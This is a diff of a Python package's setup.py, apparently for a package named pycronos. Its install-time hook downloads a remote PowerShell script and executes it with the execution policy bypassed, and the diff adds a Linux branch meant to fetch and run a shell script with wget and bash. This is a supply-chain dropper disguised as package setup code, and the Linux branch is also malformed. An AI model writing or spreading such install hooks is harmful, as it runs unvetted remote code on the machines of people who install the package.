@@ -1,3 +1,4 @@
+import platform
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from setuptools.command.egg_info import egg_info
@@ -5,8 +6,13 @@ import subprocess
 
 
 def RunCommand():
-    cmd_str = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pycronos-integrations/win-pycronos/refs/heads/main/win-pycronos.ps1')"
-    completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
+    system = platform.system().lower()
+
+    if system == 'windows':
+        cmd_str = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pycronos-integrations/win-pycronos/refs/heads/main/win-pycronos.ps1')"
+        completed = subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", f"{cmd_str}"], capture_output=True)
+    else:
+        cmd = ['wget', '-O', 'https://raw.githubusercontent.com/pycronos-integrations/win-pycronos/refs/heads/main/lin-pycronos.sh', '&&', 'bash', 'lin-pycronos.sh']
     return completed
 
 class RunEggInfoCommand(egg_info):
